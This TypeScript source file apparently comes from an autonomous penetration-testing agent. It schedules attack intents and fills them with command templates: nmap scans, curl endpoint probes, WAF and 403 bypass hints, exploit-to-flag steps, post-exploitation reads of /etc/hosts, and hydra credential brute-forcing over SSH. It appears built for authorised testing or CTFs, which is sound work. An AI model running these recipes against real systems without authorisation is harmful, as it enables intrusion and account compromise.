 * 计算待认领前沿队列（融合便携知识库经验提权与 v6.0 贝叶斯信念/VoI 价值排序，纯只读零磁盘写入）。
 */
export function frontierList(st: NuwaState, limit = 20, claimTtl = 900, root?: string): FrontierItem[] {
	const now = Date.now();
	const out: FrontierItem[] = [];
	for (const intent of Object.values(st.intents)) {
		if (intent.status !== "open" && intent.status !== "claimed") continue;
		if (intent.status === "open" && typeof intent.nextRunAt === "number" && intent.nextRunAt > now) continue;
		const missing = intent.from.filter((f) => !st.facts[f]);
		if (missing.length) continue;
		let stale = false;
		if (intent.status === "claimed") {
			const at = intent.claimedAt ? Date.parse(intent.claimedAt) : 0;
			stale = !at || now - at > claimTtl * 1000;
			if (!stale) continue;
		}
		out.push({ intent, stale, missing });
	}
	const techStack = extractStateTechStack(st);
	const agentHome = getAgentHome();
	const scoreCache = new Map<string, number>();

	// 融合信念后验、VoI 与剪枝信号：保持普通同阶种子预设优先序稳定，同时对跃迁信号置顶、对已剪枝低收益方向垫底
	const beliefDeltaMap = new Map<string, number>();
	if (out.length > 1 && isBeliefSearchEnabled()) {
		try {
			const graph = resolveBeliefGraphForRead(st, root);
			const ranked = rankFrontierByBelief(st, out, { graph });
			for (const r of ranked) {
				const node = graph.nodes[r.nodeId];
				if (r.pruned || node?.pruned) {
					beliefDeltaMap.set(r.intent.id, -45);
					continue;
				}
				const boost = node?.breakthroughBoost ?? 0;
				const obs = node?.observations ?? 0;
				// rankFrontierByBelief 返回百分制 compositeScore [0, 100+]，先归一化至 [0, 1.5] 防止量纲淹没基础优先级
				const normComposite = Math.max(0, Math.min(1.5, r.compositeScore / 100));
				let delta = (normComposite - 0.5) * 1.6;
				if (boost > 0) {
					delta += boost * 16 + r.voiScore * 6;
				} else if (obs > 0) {
					delta += (r.beliefScore - 0.5) * 18 + r.voiScore * 4;
				}
				beliefDeltaMap.set(r.intent.id, delta);
			}
		} catch {
			/* 信念辅助打分异常时安全回退基础优先级 */
		}
	}

	const effectivePriority = (it: Intent): number => {
		let boost = 0;
		if (techStack.length > 0) {
			const cached = scoreCache.get(it.key);
			if (cached !== undefined) {
				boost = cached;
			} else {
				try {
					boost = computeExperiencePriorityBoost(techStack, it.key, { agentHome });
				} catch {
					boost = 0;
				}
				scoreCache.set(it.key, boost);
			}
		}
		return it.priority + boost + (beliefDeltaMap.get(it.id) ?? 0);
	};
	out.sort((a, b) => effectivePriority(b.intent) - effectivePriority(a.intent) || a.intent.id.localeCompare(b.intent.id));
	return out.slice(0, Math.max(1, limit));
}

/** 已认领但未过 TTL 的意图：这些不是 frontier，但必须先 commit 才能推进。 */
export function claimedFresh(st: NuwaState, claimTtl = 900): Intent[] {
	const now = Date.now();
	return Object.values(st.intents).filter((i) => {
		if (i.status !== "claimed") return false;
		const at = i.claimedAt ? Date.parse(i.claimedAt) : 0;
		return !!at && now - at <= claimTtl * 1000;
	});
}

export function maybeAdvance(st: NuwaState): { advanced: boolean; phase: Phase; added: string[] } {
	const cur = st.project.phase;
	const idx = phaseIndex(cur);
	if (idx < 0 || idx >= PHASE_ORDER.length - 1) return { advanced: false, phase: cur, added: [] };
	const ints = Object.values(st.intents).filter((i) => i.phase === cur);
	if (ints.length === 0) return { advanced: false, phase: cur, added: [] };
	if (ints.some((i) => i.status === "open" || i.status === "claimed")) {
		return { advanced: false, phase: cur, added: [] };
	}
	const next = PHASE_ORDER[idx + 1];
	st.project.phase = next;
	const added = seedPhase(st, next);
	return { advanced: true, phase: next, added };
}

// ============================================================================
// 扩张与容量治理引擎（3.0.0）
// ============================================================================

const INTENT_SOFT_CAP = 800;
const BLOCKED_KEEP = 120;
const NOTE_KEEP = 200;

/** 回收过量 blocked 意图，防止无限推进把 state 撑爆；清理前先写入 attemptedKeys 防止死事实重派生（#21, #45）。 */
export function compactIntents(st: NuwaState, keep = BLOCKED_KEEP): number {
	const blocked = Object.values(st.intents)
		.filter((i) => i.status === "blocked")
		.sort((a, b) => (a.doneAt ?? a.createdAt).localeCompare(b.doneAt ?? b.createdAt));
	let removed = 0;
	for (const it of blocked.slice(0, Math.max(0, blocked.length - keep))) {
		recordAttemptedIntent(st, it, "blocked");
		delete st.intents[it.id];
		removed += 1;
	}
	return removed;
}

/**
 * Issue #8 事实容量治理：
 * 1) 按幂等键 key 去重（自动重写 intent/project 引用到保留的权威 fact）；
 * 2) 仅保留最近 keepNotes 条未被引用的 note 事实，严禁清理任何有效证据或被引用事实。
 */
export function compactFacts(st: NuwaState, keepNotes = NOTE_KEEP): number {
	let removed = 0;
	const sorted = Object.values(st.facts).sort((a, b) => a.id.localeCompare(b.id));
	const keyOwner = new Map<string, string>();
	const redirect = new Map<string, string>();

	for (const f of sorted) {
		const k = (f.key ?? "").trim();
		if (!k) continue;
		const owner = keyOwner.get(k);
		if (!owner) {
			keyOwner.set(k, f.id);
		} else if (owner !== f.id) {
			redirect.set(f.id, owner);
			delete st.facts[f.id];
			removed += 1;
		}
	}

	if (redirect.size > 0) {
		for (const it of Object.values(st.intents)) {
			if (it.from?.length) {
				it.from = [...new Set(it.from.map((fid) => redirect.get(fid) ?? fid))];
			}
			if (it.to && redirect.has(it.to)) {
				it.to = redirect.get(it.to);
			}
		}
		if (st.project.completedFrom?.length) {
			st.project.completedFrom = [...new Set(st.project.completedFrom.map((fid) => redirect.get(fid) ?? fid))];
		}
	}

	const referenced = new Set<string>();
	for (const it of Object.values(st.intents)) {
		for (const fid of it.from ?? []) referenced.add(fid);
		if (it.to) referenced.add(it.to);
	}
	for (const fid of st.project.completedFrom ?? []) referenced.add(fid);

	const unrefNotes = Object.values(st.facts)
		.filter((f) => f.kind === "note" && !referenced.has(f.id))
		.sort((a, b) => a.createdAt.localeCompare(b.createdAt) || a.id.localeCompare(b.id));

	const excess = Math.max(0, unrefNotes.length - Math.max(0, keepNotes));
	for (const f of unrefNotes.slice(0, excess)) {
		delete st.facts[f.id];
		removed += 1;
	}
	return removed;
}

export function appendIntentSpecs(
	st: NuwaState,
	specs: Array<{
		key: string;
		phase: Phase;
		title: string;
		detail: string;
		priority: number;
		from: string[];
		hypothesisId?: string;
		assetId?: string;
		authRole?: string;
		expectedKind?: FactKind;
		surfaceDomain?: SurfaceDomain;
		targetKey?: string;
		hint?: string;
	}>,
	cap = INTENT_SOFT_CAP,
	opts?: {
		rejectedOut?: RejectedIntentEntry[];
		force?: boolean;
		cooldownMs?: number;
		strictAutoDerive?: boolean;
	},
): string[] {
	const added: string[] = [];
	for (const spec of specs) {
		if (Object.keys(st.intents).length >= cap) break;
		const validFrom = (spec.from ?? []).filter((fid) => Boolean(st.facts[fid]));
		const bypassTargetSuppress = /^(?:verify-vuln:|waf-bypass:|post-auth:|session:refresh:|reflect:)/.test(spec.key);
		const built = buildIntentDedupKey(
			{
				key: spec.key,
				phase: spec.phase,
				title: spec.title,
				detail: spec.detail,
				hint: spec.hint,
				expectedKind: spec.expectedKind,
				surfaceDomain: spec.surfaceDomain,
				targetKey: spec.targetKey,
			},
			st.project.host,
		);
		const rej = checkCandidateRejection(st, built, spec.key, validFrom, {
			force: opts?.force,
			cooldownMs: opts?.cooldownMs,
			strictAutoDerive: opts?.strictAutoDerive ?? true,
			bypassTargetSuppress,
		});
		if (rej) {
			opts?.rejectedOut?.push({
				title: spec.title,
				targetKey: built.targetKey,
				reason: rej,
			});
			continue;
		}
		const id = nextIntentId(st);
		st.intents[id] = {
			id,
			phase: spec.phase,
			key: spec.key,
			title: normOneLine(spec.title, 120),
			detail: spec.detail,
			from: validFrom,
			status: "open",
			priority: spec.priority,
			attempts: 0,
			createdAt: nowIso(),
			expectedKind: built.expectedKind,
			targetKey: built.targetKey,
			surfaceDomain: built.surfaceDomain,
			dedupKey: built.dedupKey,
			hintHash: built.hintHash,
			...(spec.hypothesisId ? { hypothesisId: spec.hypothesisId } : {}),
			...(spec.assetId ? { assetId: spec.assetId } : {}),
			...(spec.authRole ? { authRole: spec.authRole } : {}),
		};
		added.push(id);
	}
	return added;
}

/**
 * 从已有事实派生下一层意图：优先消费结构化 f.meta（ports/paths/san），并兼容文本扫描。
 * 非网络安全模式（coding / ops / 本地白盒 audit）全量交由领域 Profile 插件派生，绝不混入扫描器命令；
 * 安全评估模式结合规范化三元组去重、surfaceDomain 隔离、blocked 冷却窗与 attempted 过滤器返回 rejectedReasons（#21, #25, #43）。
 */
export function deriveFromFacts(
	st: NuwaState,
	cap = INTENT_SOFT_CAP,
	opts?: { force?: boolean; cooldownMs?: number },
): ExpansionResult {
	try {
		syncAssetsFromFacts(st);
	} catch {
		/* 资产拓扑同步异常不阻塞主派生 */
	}

	const added: string[] = [];
	const rules: string[] = [];
	const rejectedReasons: RejectedIntentEntry[] = [];
	const push = (
		key: string,
		phase: Phase,
		title: string,
		detail: string,
		priority: number,
		from: string[],
		extra?: {
			hypothesisId?: string;
			assetId?: string;
			authRole?: string;
			expectedKind?: FactKind;
			surfaceDomain?: SurfaceDomain;
			sourceDomain?: SurfaceDomain;
			targetKey?: string;
			hint?: string;
		},
	) => {
		if (Object.keys(st.intents).length >= cap) return;
		const built = buildIntentDedupKey(
			{
				key,
				phase,
				title,
				detail,
				hint: extra?.hint,
				expectedKind: extra?.expectedKind,
				surfaceDomain: extra?.surfaceDomain,
				targetKey: extra?.targetKey,
			},
			st.project.host,
		);
		if (extra?.sourceDomain && !canDeriveCrossSurface(st, extra.sourceDomain, built.surfaceDomain, from)) {
			rejectedReasons.push({ title, targetKey: built.targetKey, reason: "blocked_cooldown" });
			return;
		}
		const rej = checkCandidateRejection(st, built, key, from, {
			force: opts?.force,
			cooldownMs: opts?.cooldownMs,
			strictAutoDerive: true,
		});
		if (rej) {
			rejectedReasons.push({ title, targetKey: built.targetKey, reason: rej });
			return;
		}
		const id = nextIntentId(st);
		st.intents[id] = {
			id,
			phase,
			key,
			title: normOneLine(title, 120),
			detail,
			from,
			status: "open",
			priority,
			attempts: 0,
			createdAt: nowIso(),
			expectedKind: built.expectedKind,
			targetKey: built.targetKey,
			surfaceDomain: built.surfaceDomain,
			dedupKey: built.dedupKey,
			hintHash: built.hintHash,
			...(extra?.hypothesisId ? { hypothesisId: extra.hypothesisId } : {}),
			...(extra?.assetId ? { assetId: extra.assetId } : {}),
			...(extra?.authRole ? { authRole: extra.authRole } : {}),
		};
		added.push(id);
		rules.push(key);
	};

	if (st.project.mode === "coding" || st.project.mode === "ops" || isLocalAuditProject(st)) {
		const profSpecs = deriveProfileIntents(st, Math.max(1, cap - Object.keys(st.intents).length));
		for (const sp of profSpecs) {
			push(sp.key, sp.phase, sp.title, sp.detail, sp.priority, sp.from);
		}
		return { added, rules, rejectedReasons };
	}

	const projScope =
		st.project.scope ?? defaultScopeForTarget(st.project.url || st.project.target, st.project.mode);

	const facts = Object.values(st.facts).sort((a, b) => a.id.localeCompare(b.id));
	for (const f of facts) {
		switch (f.kind) {
			case "service": {
				const metaPorts = (f.meta?.ports ?? [])
					.map((p) => Number(p))
					.filter((p) => Number.isInteger(p) && p > 0 && p <= 65535)
					.map((p) => String(p));
				const text = `${f.title} ${f.detail ?? ""} ${f.output ?? ""}`;
				const textPorts = [...text.matchAll(/\b(\d{1,5})\/(?:tcp|udp)\b/gi)].map((m) => m[1]);
				const ports = [...new Set([...metaPorts, ...textPorts])].slice(0, 8);
				for (const port of ports) {
					push(
						`svc:${f.id}:${port}`,
						"surface",
						`服务深挖 ${st.project.host}:${port}`,
						`目标: 对 ${st.project.host}:${port} 做服务级枚举与版本核对。\n命令:\n  nmap -sV -Pn -p ${port} --version-all ${st.project.host}\n  curl -k -sS -D - --max-time 10 http://${st.project.host}:${port}/ | head -30\n  printf '' | openssl s_client -connect ${st.project.host}:${port} -servername ${st.project.host} 2>/dev/null | head -20\n证据: kind=service；detail 写 service/version/banner。\n换路: 非 HTTP → nc/openssl 探 banner；全滤 → 记录 blocked 并换端口。`,
						70,
						[f.id],
						{
							expectedKind: "service",
							surfaceDomain: "port",
							targetKey: `${st.project.host}:${port}`,
							hint: "svc",
						},
					);
				}

				// 证书 SAN 域名发现：仅对合法主机名且在项目 Scope 内的新域名派生资产枚举
				const metaSans = f.meta?.san ?? [];
				const textSans = [...text.matchAll(/\bDNS:([a-zA-Z0-9*.-]+\.[a-zA-Z]{2,24})\b/gi)].map((m) => m[1]);
				const sanDomains = [...new Set([...metaSans, ...textSans])]
					.map((d) => d.trim().replace(/^\*\./, "").toLowerCase())
					.filter(
						(d) =>
							/^[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\.[a-z]{2,24}$/.test(d) && d !== st.project.host.toLowerCase(),
					);
				for (const domain of sanDomains.slice(0, 6)) {
					if (!isHostInScope(domain, projScope).ok) continue;
					push(
						`san:${f.id}:${domain}`,
						"recon",
						`SAN 资产枚举 ${domain}`,
						`目标: 证书 SAN 发现 Scope 内新域名 ${domain}，执行存活与服务指纹核查。\n命令:\n  curl -k -sS -D - --max-time 10 'https://${domain}/' | head -30\n  curl -k -sS -D - --max-time 10 'http://${domain}/' | head -30\n证据: kind=asset 或 service；记录状态码、标题与指纹。`,
						74,
						[f.id],
						{
							expectedKind: "asset",
							surfaceDomain: "host",
							sourceDomain: f.surfaceDomain,
							targetKey: domain,
							hint: "san",
						},
					);
				}

				const techSet = new Set((f.meta?.tech ?? []).map((t) => t.toLowerCase()));
				const looksLikeSpa =
					["react", "vue", "nextjs", "nuxt", "angular"].some((k) => techSet.has(k)) ||
					/__NEXT_DATA__|__NUXT__|data-reactroot|id=["'](?:root|app|__next|__nuxt)["']|type=["']module["']|\b(?:bundle|chunk|app)\.[a-z0-9]{6,}\.js\b/i.test(
						text,
					);
				if (looksLikeSpa && st.project.scheme !== "local") {
					push(
						"surface:spa",
						"surface",
						"SPA 前端路由与 JS Bundle 接口感知",
						`目标: 提取 ${st.project.url} 的单页应用前端路由与同源 JS Bundle API 契约（GET/POST/GraphQL 端点与键名）。\n说明: 自动批与 /nuwa spa 会优先执行受控只读浏览器/静态 Bundle 感知，也可结合同源脚本清单核查后端真实接口，避免将 SPA HTML 兜底页误判为敏感文件。`,
						84,
						[f.id],
						{
							expectedKind: "endpoint",
							surfaceDomain: "path",
							sourceDomain: "port",
						},
					);
				}

				if (st.project.toolchain && st.project.scheme !== "local") {
					for (const enrich of enrichmentRulesForToolchain(st.project.toolchain)) {
						push(
							enrich.key,
							enrich.phase,
							enrich.key === "recon:katana" ? "Katana 深度路由与脚本收敛" : "Nuclei 非破坏性暴露面与配置基线核查",
							`目标: 基于本机已就绪工具链执行 ${enrich.key} 受控非破坏性表面核查。`,
							82,
							[f.id],
							{
								expectedKind: enrich.key === "recon:katana" ? "endpoint" : "vuln",
								surfaceDomain: "path",
								sourceDomain: "port",
							},
						);
					}
				}
				break;
			}
			case "endpoint": {
				const sanitizePath = (raw: string): string | null => {
					const clean = raw.trim();
					return /^\/[A-Za-z0-9._~:/?=&%-]{0,120}$/.test(clean) ? clean : null;
				};
				const metaPaths = (f.meta?.paths ?? [])
					.map((p) => sanitizePath(p))
					.filter((p): p is string => Boolean(p));
				if (metaPaths.length > 0) {
					for (const p of [...new Set(metaPaths)].slice(0, 8)) {
						push(
							`ep:${f.id}:${p}`,
							"vuln",
							`端点审计 ${p}`,
							`目标: 对 ${st.project.url}${p} 做参数、方法、认证、越权四类检查。\n命令:\n  curl -k -sS -i --max-time 10 '${st.project.url}${p}'\n  curl -k -sS -i -X OPTIONS --max-time 10 '${st.project.url}${p}'\n  curl -k -sS -i -X POST -H 'Content-Type: application/json' -d '{}' --max-time 10 '${st.project.url}${p}'\n证据: kind=vuln 或 endpoint；无问题则 commit(kind=note) 写清已测面。\n换路: 403 → 加 X-Forwarded-For / 换方法 / 路径规范化。`,
							68,
							[f.id],
							{
								expectedKind: "vuln",
								surfaceDomain: "path",
								targetKey: p,
								hint: "ep",
							},
						);
					}
				} else {
					const rawTitlePath = (f.title.match(/\/[^\s"']{1,80}/) ?? [])[0];
					const titlePath = rawTitlePath ? sanitizePath(rawTitlePath) ?? "/" : undefined;
					const bodyText = `${f.detail ?? ""}\n${f.output ?? ""}`;
					const scannedPaths = [
						...new Set(
							[...bodyText.matchAll(/(?:^|[\s"'|])(\/[A-Za-z0-9._/-]{1,80})/gm)].map((m) => m[1]),
						),
					].slice(0, 8);
					if (!titlePath && scannedPaths.length > 1) {
						for (const p of scannedPaths) {
							push(
								`ep:${f.id}:${p}`,
								"vuln",
								`端点审计 ${p}`,
								`目标: 对 ${st.project.url}${p} 做参数、方法、认证、越权四类检查。\n命令:\n  curl -k -sS -i --max-time 10 '${st.project.url}${p}'\n  curl -k -sS -i -X OPTIONS --max-time 10 '${st.project.url}${p}'\n  curl -k -sS -i -X POST -H 'Content-Type: application/json' -d '{}' --max-time 10 '${st.project.url}${p}'\n证据: kind=vuln 或 endpoint；无问题则 commit(kind=note) 写清已测面。\n换路: 403 → 加 X-Forwarded-For / 换方法 / 路径规范化。`,
								68,
								[f.id],
								{
									expectedKind: "vuln",
									surfaceDomain: "path",
									targetKey: p,
									hint: "ep",
								},
							);
						}
					} else {
						const path = titlePath ?? scannedPaths[0] ?? "/";
						push(
							`ep:${f.id}`,
							"vuln",
							`端点审计 ${path}`,
							`目标: 对 ${st.project.url}${path} 做参数、方法、认证、越权四类检查。\n命令:\n  curl -k -sS -i --max-time 10 '${st.project.url}${path}'\n  curl -k -sS -i -X OPTIONS --max-time 10 '${st.project.url}${path}'\n  curl -k -sS -i -X POST -H 'Content-Type: application/json' -d '{}' --max-time 10 '${st.project.url}${path}'\n证据: kind=vuln 或 endpoint；无问题则 commit(kind=note) 写清已测面。\n换路: 403 → 加 X-Forwarded-For / 换方法 / 路径规范化。`,
							68,
							[f.id],
							{
								expectedKind: "vuln",
								surfaceDomain: "path",
								targetKey: path,
								hint: "ep",
							},
						);
					}
				}
				break;
			}
			case "vuln": {
				if (f.verifyStage === "candidate" || f.verifyStage === "rejected") {
					break;
				}
				push(
					`exp:${f.id}`,
					"exploit",
					`利用验证 ${normOneLine(f.title, 60)}`,
					`目标: 把已确认漏洞 ${f.id} 推到可复现的利用结果（读敏感数据 / 命令执行 / 越权访问）。\n已知证据:\n  命令: ${normOneLine(f.command ?? "", 200)}\n  回显: ${normOneLine(f.output ?? "", 300)}\n要求: 给出可重复的最小利用命令与回显；拿到 flag 立即 nuwa_flag。\n换路: 被 WAF 拦 → 编码/分块/换 payload；仍失败 → commit(blocked) 写清拦截特征。`,
					92,
					[f.id],
					{ expectedKind: "vuln", hint: `exp:${f.id}` },
				);
				push(
					`pivot:${f.id}`,
					"post",
					`横向面 ${normOneLine(f.title, 50)}`,
					`目标: 评估 ${f.id} 能否作为横向跳板。\n命令:\n  id; hostname; ip a; cat /etc/hosts 2>/dev/null\n  ss -lntp 2>/dev/null || netstat -lntp 2>/dev/null\n证据: kind=loot 或 asset；detail 写内网网段、可达主机、可用凭据。\n换路: 无命令执行 → commit(blocked, note="仅数据面漏洞")。`,
					55,
					[f.id],
					{ expectedKind: "loot", hint: `pivot:${f.id}` },
				);
				break;
			}
			case "cred": {
				push(
					`reuse:${f.id}`,
					"post",
					`凭据复用 ${normOneLine(f.title, 50)}`,
					`目标: 用凭据 ${f.id} 撞已发现的服务（SSH/MySQL/Redis/管理面/后台）。\n命令:\n  hydra -L users.txt -P pass.txt -f ${st.project.host} ssh\n  curl -k -sS -i -u '<user>:<pass>' ${st.project.url}/admin\n证据: kind=loot 或 cred；成功必须给登录后页面/命令回显。\n换路: 锁定风险 → 每服务最多 3 次，换下一服务。`,
					78,
					[f.id],
					{ expectedKind: "loot", hint: `reuse:${f.id}` },
				);
				break;
			}
			case "asset": {
				push(
					`enum:${f.id}`,
					"recon",
					`资产枚举 ${normOneLine(f.title, 50)}`,
					`目标: 对新资产 ${f.id} 做端口与服务枚举。\n命令:\n  nmap -sT -sV -Pn -T4 --top-ports 1000 ${normOneLine(f.detail, 120) || st.project.host}\n证据: kind=service，每端口一条。`,
					72,
					[f.id],
					{ expectedKind: "service", surfaceDomain: "host", hint: `enum:${f.id}` },
				);
				break;
			}
			case "loot": {
				push(
					`loot:${f.id}`,
					"report",
					`战利品复盘 ${normOneLine(f.title, 50)}`,
					`目标: 复盘 ${f.id} 的利用价值与可复用性（凭据/密钥/配置/源码）。\n输出: 报告攻击链段落 + 是否需要横向；有价值则派生新意图。`,
					45,
					[f.id],
					{ expectedKind: "note", hint: `loot:${f.id}` },
				);
				break;
			}
			default:
				break;
		}
	}

	try {
		const synth = synthesizeCrossFactHypotheses(st, 6);
		for (const sp of synth.intents) {
			push(sp.key, sp.phase, sp.title, sp.detail, sp.priority, sp.from, {
				hypothesisId: sp.hypothesisId,
				...(sp.assetId ? { assetId: sp.assetId } : {}),
			});
		}
	} catch {
		/* 假设图推理异常不阻塞主派生 */
	}

	return { added, rules, rejectedReasons };
}

/** 第 N 轮扩张：完整重播六阶段种子，key 带轮次前缀，优先级随轮次衰减。 */
export function seedEpisode(st: NuwaState, episode: number): string[] {
	const added: string[] = [];
	const existing = new Set(Object.values(st.intents).map((i) => i.key));
	const decay = Math.min(25, Math.max(0, (episode - 1) * 2));
	for (const phase of PHASE_ORDER) {
		for (const s of seedsForProject(st, phase)) {
			const key = `e${episode}:${phase}:${s.key}`;
			if (existing.has(key)) continue;
			const built = buildIntentDedupKey(
				{
					key,
					phase,
					title: `[E${episode}] ${s.title}`,
					detail: s.detail,
					expectedKind: s.expectedKind,
					surfaceDomain: s.surfaceDomain,
					hint: `e${episode}:${phase}:${s.key}`,
				},
				st.project.host,
			);
			const id = nextIntentId(st);
			st.intents[id] = {
				id,
				phase,
				key,
				title: `[E${episode}] ${s.title}`,
				detail: `第 ${episode} 轮扩张（目标 ${st.project.url}）：同一攻击面必须换字典/换方法/换参数，优先验证上一轮未闭环的线索。\n\n${s.detail}`,
				from: [],
				status: "open",
				priority: Math.max(20, (s.priority ?? 50) - decay),
				attempts: 0,
				createdAt: nowIso(),
				expectedKind: built.expectedKind,
				targetKey: built.targetKey,
				surfaceDomain: built.surfaceDomain,
				dedupKey: built.dedupKey,
				hintHash: built.hintHash,
			};
			added.push(id);
		}
	}
	return added;
}

/** frontier 彻底空时的兜底：按领域 Profile 生成强制深挖意图，保证队列永不为空且不跨领域污染。 */
export function addFallbackIntent(st: NuwaState): string | null {
	if (Object.keys(st.intents).length >= INTENT_SOFT_CAP + 200) return null;
	const ep = st.project.episode ?? 1;
	const n = Object.values(st.intents).filter((i) => i.key.startsWith("fallback:")).length + 1;
	const key = `fallback:e${ep}:${n}`;
	if (Object.values(st.intents).some((i) => i.key === key)) return null;
	const fbSpec = buildProfileFallbackIntent(st, n);
	const id = nextIntentId(st);
	st.intents[id] = {
		id,
		phase: st.project.phase,
		key,
		title: normOneLine(fbSpec.title, 120),
		detail: fbSpec.detail,
		from: [],
		status: "open",
		priority: fbSpec.priority,
		attempts: 0,
		createdAt: nowIso(),
	};
	st.runtime.expansions = (st.runtime.expansions ?? 0) + 1;
	st.runtime.lastExpandAt = Date.now();
	return id;
}

/** 超过 claim TTL 仍挂着的意图释放回 open；否则它们会永久占住 live 位，阻塞扩张。 */
export function releaseStaleClaims(st: NuwaState, claimTtl: number): string[] {
	const now = Date.now();
	const out: string[] = [];
	for (const i of Object.values(st.intents)) {
		if (i.status !== "claimed") continue;
		const at = i.claimedAt ? Date.parse(i.claimedAt) : 0;
		if (!at || now - at > claimTtl * 1000) {
			i.status = "open";
			i.worker = undefined;
			i.claimedAt = undefined;
			out.push(i.id);
		}
	}
	return out;
}

/**
 * Issue #4 二维空转闸 + Issue #30 语义停滞计数器 noveltyStall：
 * - 无工具活动且有效非 blocked 事实不涨 → 计 emptyRounds（达 emptyLimit 收口）；
 * - 有工具活动且有效非 blocked 事实不涨 → 计 suspectRounds（达 suspectLimit=5 才收口）；
 * - 同步推进 noveltyStall（blocked=true 提交绝不重置，仅产出新非 blocked Fact 时归零）。
 */
export function applyEmptyGuard(st: NuwaState, cfg: Cfg, hadToolActivity = false): string[] {
	const factsNow = countNovelFacts(st);
	const suspectLimit = cfg.suspectLimit ?? 5;
	tickNoveltyStall(st, cfg);

	if (factsNow !== (st.runtime.lastFacts ?? -1) && factsNow > Math.max(0, st.runtime.lastFacts ?? -1)) {
		st.runtime.emptyRounds = 0;
		st.runtime.suspectRounds = 0;
		st.runtime.lastFacts = factsNow;
		return [];
	}
	if (st.runtime.lastFacts === undefined || st.runtime.lastFacts < 0) {
		st.runtime.lastFacts = factsNow;
	}

	let shouldClose = false;
	let noteReason = "";
	if (hadToolActivity) {
		st.runtime.suspectRounds = (st.runtime.suspectRounds ?? 0) + 1;
		if (st.runtime.suspectRounds >= suspectLimit) {
			shouldClose = true;
			noteReason = `疑似空转: 连续 ${suspectLimit} 轮有工具无产出（无新事实）`;
		}
	} else {
		st.runtime.emptyRounds = (st.runtime.emptyRounds ?? 0) + 1;
		if (st.runtime.emptyRounds >= cfg.emptyLimit) {
			shouldClose = true;
			noteReason = `空转: 连续 ${cfg.emptyLimit} 轮无新事实`;
		}
	}

	if (!shouldClose) return [];

	const stalled = Object.values(st.intents).filter((i) => i.status === "claimed" && i.worker !== "auto");
	for (const it of stalled) {
		it.status = "blocked";
		it.note = noteReason;
		it.doneAt = nowIso();
		recordAttemptedIntent(st, it, "blocked");
	}
	st.runtime.emptyRounds = 0;
	st.runtime.suspectRounds = 0;
	return stalled.map((i) => i.id);
}

/** 领自动批：白名单 key（含工具链升档规则与 surface:spa）、open、冷却已过、依赖满足、尝试未超限；标 claimed(worker=auto) 并返回 id。 */
export function claimAutoBatch(st: NuwaState, cfg: Cfg, root?: string): string[] {
	if (!cfg.auto) return [];
	const now = Date.now();
	const rawIds = pickAuto(st, cfg, cfg.autoMax, now, root, getAgentHome());
	const extraAllowed = new Set<string>(["surface:spa"]);
	for (const r of enrichmentRulesForToolchain(st.project.toolchain)) {
		extraAllowed.add(r.key);
	}
	if (rawIds.length < cfg.autoMax) {
		const extraCandidates = Object.values(st.intents)
			.filter((it) => {
				if (it.status !== "open") return false;
				if (rawIds.includes(it.id)) return false;
				if (!extraAllowed.has(canonicalAutoKey(it.key))) return false;
				if (it.attempts >= cfg.maxAttempts) return false;
				if (typeof it.nextRunAt === "number" && it.nextRunAt > now) return false;
				return it.from.every((fid) => Boolean(st.facts[fid]));
			})
			.sort((a, b) => b.priority - a.priority || a.id.localeCompare(b.id));
		for (const c of extraCandidates) {
			if (rawIds.length >= cfg.autoMax) break;
			rawIds.push(c.id);
		}
	}
	const ids: string[] = [];
	for (const id of rawIds) {
		const it = st.intents[id];
		if (!it || it.status !== "open") continue;
		if (typeof it.nextRunAt === "number" && it.nextRunAt > now) continue;
		it.status = "claimed";
		it.worker = "auto";
		it.claimedAt = nowIso();
		it.attempts += 1;
		ids.push(id);
	}
	return ids;
}

export function autoPlan(st: NuwaState, cfg: Cfg): AutoPlanResult {
	const rejectedReasons: RejectedIntentEntry[] = [];
	if (st.project.status === "sealed_negative" || st.runtime.status === "sealed_negative") {
		return { added: [], reason: "sealed", phase: st.project.phase, rejectedReasons };
	}

	compactIntents(st);
	compactFacts(st);
	releaseStaleClaims(st, cfg.claimTtl);
	// 尝试上限：同一条意图烧到上限仍无产出，转停驻态，别让它占着 live 位。
	for (const it of Object.values(st.intents)) {
		if ((it.status === "open" || it.status === "claimed") && it.attempts >= cfg.maxAttempts) {
			it.status = "blocked";
			it.note = `尝试上限 ${cfg.maxAttempts}: 未产出，换路`;
			it.doneAt = nowIso();
			recordAttemptedIntent(st, it, "blocked");
		}
	}

	const cooldownMs = readEnvCooldownMs(cfg);
	const curPhaseIntents = Object.values(st.intents).filter((i) => i.phase === st.project.phase);
	const curPhaseLive = curPhaseIntents.filter((i) => i.status === "open" || i.status === "claimed");
	const curPhaseSettled = curPhaseIntents.length - curPhaseLive.length;
	const phaseClosing =
		curPhaseLive.length === 1 && curPhaseSettled >= 2 && Object.keys(st.facts).length > 0;

	if ((st.runtime.stall ?? 0) >= 3 || phaseClosing) {
		const trigger = (st.runtime.stall ?? 0) >= 3 ? `stall=${st.runtime.stall}` : `phase-closing:${st.project.phase}`;
		const reflectSpec = buildReflectIntentSpec(st, trigger);
		if (reflectSpec) {
			const reflectAdded = appendIntentSpecs(st, [reflectSpec], INTENT_SOFT_CAP, { rejectedOut: rejectedReasons, cooldownMs });
			if (reflectAdded.length) {
				st.runtime.expansions = (st.runtime.expansions ?? 0) + 1;
				st.runtime.lastExpandAt = Date.now();
				return { added: reflectAdded, reason: "reflect", phase: st.project.phase, rejectedReasons };
			}
		}
	}

	const live = Object.values(st.intents).filter((i) => i.status === "open" || i.status === "claimed");
	if (live.length) return { added: [], reason: "frontier-live", rejectedReasons };

	const seeded = seedPhase(st, st.project.phase);
	if (seeded.length) return { added: seeded, reason: "seed-current", phase: st.project.phase, rejectedReasons };

	// #45 修复 report 阶段死锁：在 report 阶段已完成种子收尾后，禁止重展旧阶段已死事实；
	// 若报告已写或满足收敛/停滞条件（即使 vuln/exploit/post === 0），直接给出干净阶段收口信号。
	if (st.project.phase === "report") {
		const reportTrans = resolveReportPhaseTransition(st, {
			reportWritten: st.runtime.reportWritten,
			noveltyThreshold: readNoveltyThreshold(cfg),
			maxEpisodes: cfg.maxEpisodes,
		});
		if (reportTrans.action === "complete") {
			return { added: [], reason: "report-ready-complete", phase: "report", rejectedReasons };
		}
		if (reportTrans.action === "seal_negative") {
			return { added: [], reason: "report-seal-ready", phase: "report", rejectedReasons };
		}
	} else {
		const derived = deriveFromFacts(st, INTENT_SOFT_CAP, { cooldownMs });
		rejectedReasons.push(...derived.rejectedReasons);
		const kbSpecs = deriveKbIntents(st, (q, k, lim) => kbLookup(q, k, lim));
